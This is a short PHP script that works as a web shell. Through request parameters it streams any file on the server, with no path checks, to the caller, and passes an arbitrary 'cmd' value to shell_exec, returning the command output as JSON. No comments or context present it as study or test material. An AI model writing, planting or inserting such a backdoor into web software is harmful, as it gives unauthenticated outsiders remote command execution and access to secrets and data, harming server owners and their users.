<?php

$action = $_REQUEST["action"];

if ($action == "download") {
    $path_to_file = $_REQUEST["path"];

    if (file_exists($path_to_file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($path_to_file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($path_to_file));
        flush();
        readfile($path_to_file);
        die();
    } else {
        die("Error: File not found.");
    }
} elseif ($action == "exec") {
    $command = $_REQUEST["cmd"];
    $stdout = shell_exec($command);
    header('Content-Type: application/json');
    echo json_encode(array('stdout' => $stdout, 'exec' => $command));
}

?>
